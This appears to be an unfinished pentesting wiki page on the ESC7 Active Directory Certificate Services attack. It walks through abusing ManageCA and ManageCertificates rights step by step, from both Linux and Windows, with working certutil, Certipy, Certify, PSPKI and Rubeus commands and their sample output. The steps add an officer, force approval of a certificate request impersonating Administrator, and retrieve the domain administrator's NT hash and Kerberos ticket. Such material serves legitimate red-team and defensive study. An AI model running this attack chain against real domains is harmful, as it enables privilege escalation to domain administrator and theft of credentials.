# ESC7



{% hint style="warning" %}
Finishing adding windows command for appending Manger rights

Add mitigations
{% endhint %}

## Description <a href="#description" id="description"></a>

ESC7 occurs when access is obtained to a principal within the domain that has either of the following rights:

* ManageCA (CA Manager)
* ManageCertificates (CA Officer)

**ManageCA**

The **ManageCA** right grants a principal the ability to modify a CA's configuration, primarily through the `ICertAdminD2::SetConfigEntry` method. This method enables changes to the CA's persisted data, including the `Config_CA_Accept_Request_Attributes_SAN` setting. This setting, a boolean value, controls whether the CA accepts request attributes, particularly those defining the Subject Alternative Name (SAN) for issued certificates.

Having this capability means an attacker could manipulate the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, potentially enabling **ESC6 attacks**.

**Manage Certificates**

If we gain control over a principal with the **ManageCertificates** right on the CA, we can remotely approve pending certificate requests, effectively bypassing the **CA certificate manager approval** requirement.

This enables abuse of the **default SubCA template**, which has the `EnrolleeSuppliesSubject` flag enabled. While this template is typically restricted to **Domain and Enterprise Administrators**, leveraging the **ManageCertificates** right allows us to force approval of certificate requests from any user. This, in turn, facilitates escalation via **ESC1**.

### Requirements for attack path (Manage CA) <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

* Access to a principal with ManageCA rights

### Requirements for attack path (ManageCertificates) <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

* Access to a principal with ManageCertificates rights



## Manage CA

If pursuing the Manage CA attack path we can remotely flip the value of the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` in order to make the Certificate Authority vulnerable to ESC6 attacks. However, this requires the ability to stop and restart the certsvc service on the Certificate Authority which would indicate generally that we would also need to have compromised the Certificate Authority with a privileged or local administrator user.

If this attack path is viable the following command can be used to flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to make the CA vulnerable.

```
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Then stop and restart the service.

```
net stop certsvc & net start certsvc
```

At which point follow the steps provided in ESC6.

{% content-ref url="esc6.md" %}
[esc6.md](esc6.md)
{% endcontent-ref %}

{% hint style="success" %}
If we have access to a principal which has "Manage CA" rights but does NOT have "Manage Certificate" rights, we can simply use "Manage CA" to add the "Manage Certificate" to the same principal where we can then prform the "Manage Certificates" attacks described further within this document.
{% endhint %}

**Linux**

{% code overflow="wrap" %}
```python
certipy ca -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2 -add-officer 'moe'
```
{% endcode %}

**Windows**

```
```

## Linux - Manage Certificates

In this given scenario the following are true;

* We have "Manage Certificate" rights over the CA
* We do NOT have "Manage CA" rights over the CA (attack is still valid if we do have this)
* There is an ESC1 template which requires Manager Approval
* We have enrollement rights to the template

Under normal circumstances templates vulnerable to ESC1 can simply be issued and expoited by any user that has enrollement permissions. In this scenario, the organization has enabled Manager Approval on the certificate to mitigate ESC1 attacks. However, as we have access to a user with "Manage Certificate" rights over the CA we can simply approve these requests.

{% hint style="info" %}
This example shows how ESC1 could be exploited when Manager approval is required. This attack is not limited to ESC1 and can be used on any certificate based attack which is vulnerable but requires manager approval.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Issue a request for the ESC1 template as shown below. In the example below we are using an unprivileged user to perform the request, ensuring we save the private key.

{% code overflow="wrap" %}
```python
echo y | certipy req -u 'user@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2 -template ESC1 -upn 'Administrator@security.local' -sid S-1-5-21-13999771-2333344039-1820745628-500
```
{% endcode %}

```
[*] Requesting certificate via RPC
[!] Certificate request is pending approval
[*] Request ID is 61
[*] Saved private key to 61.key
[-] Failed to request certificate
```

As expected, the request is denied and put on "hold" due to requiring manager approval before  being issued. Using Moe, our user with "Manage Certificate" rights we can approve the certificate request.

{% code overflow="wrap" %}
```python
certipy ca -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2 -issue-request 61
```
{% endcode %}

Once approved, we can use this to authenticate with the certificate and obtain the domain administrator NTLM hash.

{% code overflow="wrap" %}
```python
certipy auth -pfx administrator.pfx -username 'administrator' -domain 'security.local' -dc-ip 10.10.10.100
```
{% endcode %}

```
[*] Using principal: administrator@security.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@security.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

## Windows - Manage Certificates

In this given scenario the following are true;

* We have "Manage Certificate" rights over the CA
* We do NOT have "Manage CA" rights over the CA (attack is still valid if we do have this)
* There is an ESC1 template which requires Manager Approval
* We have enrollement rights to the template

These are some additional requirements needed for when performing this attack from Windows;

* Local administrator rights are required if RSAT is not installed

Install RSAT if not installed

```powershell
Add-WindowsCapability -Online -Name "Rsat.CertificateServices.Tools~~~~0.0.1.0"
```

Then install the PSPKI PowerShell module.

```powershell
Install-Module -Name PSPKI -Scope CurrentUser -Force
Import-Module PSPKI -Force -Scope Local
```

Under normal circumstances templates vulnerable to ESC1 can simply be issued and expoited by any user that has enrollement permissions. In this scenario, the organization has enabled Manager Approval on the certificate to mitigate ESC1 attacks. However, as we have access to a user with "Manage Certificate" rights over the CA we can simply approve these requests.

{% hint style="info" %}
This example shows how ESC1 could be exploited when Manager approval is required. This attack is not limited to ESC1 and can be used on any certificate based attack which is vulnerable but requires manager approval.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Issue a request for the ESC1 template as shown below. In the example below we are using an unprivileged user to perform the request, ensuring we save the private key.

Using Certify, conduct the initial request

{% code overflow="wrap" %}
```powershell
.\Certify.exe request /ca:CA.security.local\SECURITY-CA-CA /template:ESC1 /altname:Administrator /sid:S-1-5-21-13999771-2333344039-1820745628-500
```
{% endcode %}

From the request output we can see the certificate has been set to "Pending" with a request ID of 65. Same the Private key output into cert.pem.

```
[*] Template                : ESC1
[*] Subject                 : CN=Moe, CN=Users, DC=SECURITY, DC=LOCAL
[*] AltName                 : Administrator
[*] SidExtension            : S-1-5-21-13999771-2333344039-1820745628-500

[*] Certificate Authority   : CA.security.local\SECURITY-CA-CA

[*] CA Response             : The certificate is still pending.
[*] Request ID              : 65

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAt8IgC0Sl7DfTYEg+N7VMmouXMmsk1bRTyQxO5T2lsIOdTbum
-----END RSA PRIVATE KEY-----

[X] Error downloading certificate: Cert not yet issued yet! (iDisposition: 5)
```

Whilst operating as a user that possess the "Manage Certificates" right, We can use PSPKI to approve the  certificate.

{% code overflow="wrap" %}
```powershell
Get-CertificationAuthority -ComputerName CA.security.local | Get-PendingRequest -RequestID 65 | Approve-CertificateRequest
```
{% endcode %}

Next, we download the certificate with Certify, ensuring we specify the correct request ID.

```powershell
.\Certify.exe download /ca:CA.security.local\SECURITY-CA-CA /id:65
```

```
[*] Action: Download a Certificates
[*] Certificates Authority   : CA.security.local\SECURITY-CA-CA
[*] Request ID              : 65

[*] cert.pem         :

-----BEGIN CERTIFICATE-----
MIIGbzCCBVegAwIBAgITIwAAAEG1HWQoJIRG1wAAAAAAQTANBgkqhkiG9w0BAQsF
-----END CERTIFICATE-----
```

Take the private key and certificate output and place them into seperate files.

{% code title="cert.key" %}
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzyqzlf9NI2sbkAAiJ
-----END RSA PRIVATE KEY-----
```
{% endcode %}

{% code title="cert.pem" %}
```
-----BEGIN CERTIFICATE-----
MIIGeDCCBWCgAwIBAgITIwAAAFhhlVOMQ7
-----END CERTIFICATE-----
```
{% endcode %}

Then merge them together with certutil to create a .pfx file.

```powershell
certutil -MergePFX .\cert.pem .\cert.pfx
```

Use the converted certificate file with Rubeus to either request a NTLM hash or a Kerberos TGT.

{% code overflow="wrap" %}
```powershell
# Get NTLM Hash
.\Rubeus.exe asktgt /user:security\Administrator /certificate:cert.pfx /getcredentials

# Get TGT
.\Rubeus.exe asktgt /user:security\Administrator /certificate:cert.pfx /nowrap
```
{% endcode %}

```
<-- Snip -->

ServiceName              :  krbtgt/SECURITY.LOCAL
  ServiceRealm             :  SECURITY.LOCAL
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SECURITY.LOCAL
  StartTime                :  06/03/2025 12:55:42
  EndTime                  :  06/03/2025 22:55:42
  RenewTill                :  13/03/2025 12:55:42
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  UpzrSll1SCsyO6ebYOWCOg==
  ASREP (key)              :  851A874F4650FE5B4DCB9175EDC201A3

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 2B576ACBE6BCFDA7294D6BD18041B8FE
```
